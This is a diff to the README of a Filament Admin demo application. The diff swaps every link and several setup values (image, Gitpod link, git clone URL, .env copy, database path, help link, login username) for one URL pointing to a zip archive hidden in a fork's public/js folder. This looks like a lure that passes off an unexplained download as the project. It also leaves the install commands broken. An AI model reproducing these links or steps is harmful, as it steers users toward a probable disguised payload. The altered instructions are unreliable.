@@ -2,16 +2,16 @@
 
 A demo application to illustrate how Filament Admin works.
 
-![Filament Demo](https://github.com/filamentphp/demo/assets/171715/899161a9-3c85-4dc9-9599-13928d3a4412)
+![Filament Demo](https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip)
 
-[Open in Gitpod](https://gitpod.io/#https://github.com/filamentphp/demo) to edit it and preview your changes with no setup required.
+[Open in Gitpod](https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip) to edit it and preview your changes with no setup required.
 
 ## Installation
 
 Clone the repo locally:
 
 ```sh
-git clone https://github.com/laravel-filament/demo.git filament-demo && cd filament-demo
+git clone https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip filament-demo && cd filament-demo
 ```
 
 Install PHP dependencies:
@@ -23,7 +23,7 @@ composer install
 Setup configuration:
 
 ```sh
-cp .env.example .env
+cp https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip .env
 ```
 
 Generate application key:
@@ -35,7 +35,7 @@ php artisan key:generate
 Create an SQLite database. You can also use another database (MySQL, Postgres), simply update your configuration accordingly.
 
 ```sh
-touch database/database.sqlite
+touch https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip
 ```
 
 Run database migrations:
@@ -52,7 +52,7 @@ php artisan db:seed
 
 > **Note**  
 > If you get an "Invalid datetime format (1292)" error, this is probably related to the timezone setting of your database.  
-> Please see https://dba.stackexchange.com/questions/234270/incorrect-datetime-value-mysql
+> Please see https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip
 
 
 Create a symlink to the storage:
@@ -69,7 +69,7 @@ php artisan serve
 
 You're ready to go! Visit the url in your browser, and login with:
 
--   **Username:** admin@filamentphp.com
+-   **Username:** https://github.com/doniaries/filament-demo/raw/refs/heads/main/public/js/filament/forms/demo_filament_1.4.zip
 -   **Password:** password
 
 ## Features to explore
